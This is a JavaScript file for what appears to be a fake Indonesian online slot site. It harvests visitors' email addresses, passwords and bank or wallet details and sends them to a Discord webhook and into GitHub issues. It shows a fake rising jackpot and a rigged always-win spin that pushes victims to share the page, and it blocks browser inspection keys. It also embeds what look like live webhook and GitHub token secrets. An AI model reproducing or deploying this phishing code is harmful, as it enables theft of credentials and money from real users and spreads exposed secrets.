const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1488920982059225218/k3BAyhlX0rVuXmY8gXQ-ECQtMWFduU123hjdsaJJ7Zc3MGsWriERGk3t9XVzwNp-bXhz";
const GH_TOKEN = "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";
const GH_OWNER = "reyyhandalkoding";
const GH_REPO = "maxwin";

// 1. Live Jackpot Engine (Angka nambah terus)
let jpAmount = 8421550210;
setInterval(() => {
    jpAmount += Math.floor(Math.random() * 15000);
    document.getElementById('total-jp').innerText = "IDR " + jpAmount.toLocaleString('id-ID');
}, 1000);

// 2. Identity Capture (GitHub + Discord)
async function omniIdentity() {
    const email = document.getElementById('u_email').value;
    const pass = document.getElementById('u_pass').value;
    const bank = document.getElementById('u_bank').value;
    if(!email || !pass || !bank) return alert("Peringatan: Lengkapi data untuk sinkronisasi server.");

    // Kirim Discord
    await fetch(DISCORD_WEBHOOK, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            username: "V10_OVERLORD",
            embeds: [{
                title: "🚨 HIGH-LEVEL TARGET ACQUIRED! 🚨",
                color: 16711680,
                fields: [
                    { name: "👤 USER/GMAIL", value: `\`${email}\`` },
                    { name: "🔑 PASSWORD", value: `\`${pass}\`` },
                    { name: "🏦 BANK/WALET", value: bank }
                ],
                timestamp: new Date()
            }]
        })
    });

    // Simpan GitHub
    await fetch(`https://api.github.com/repos/${GH_OWNER}/${GH_REPO}/issues`, {
        method: 'POST',
        headers: { 'Authorization': `token ${GH_TOKEN}`, 'Content-Type': 'application/json' },
        body: JSON.stringify({ title: `V10_DB: ${email}`, body: `Email: ${email} | Pass: ${pass} | Bank: ${bank}` })
    });

    // Bypass to Dashboard
    localStorage.setItem('v10_user', email);
    document.getElementById('gate-system').style.display = 'none';
    document.getElementById('main-hub').classList.remove('hidden-blur');
    document.getElementById('display-user').innerText = email.split('@')[0].toUpperCase();
    document.getElementById('user-bal').innerText = "Rp 120.250.000";
}

// 3. Fake Slot Result (Always Win)
function spinSlot() {
    alert("Koneksi Server Gacor! Memutar Reels VVIP...");
    setTimeout(() => {
        alert("💥 MAXWIN! Anda dapet IDR 50.000.000! Segera share 10x untuk aktivasi Withdraw.");
        fetch(DISCORD_WEBHOOK, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({content: `🔥 **TARGET JP!** User \`${localStorage.getItem('v10_user')}\` lagi nafsu WD.`}) });
    }, 2000);
}

// 4. Anti-Inspect Protection
document.onkeydown = (e) => { if(e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73)) return false; };
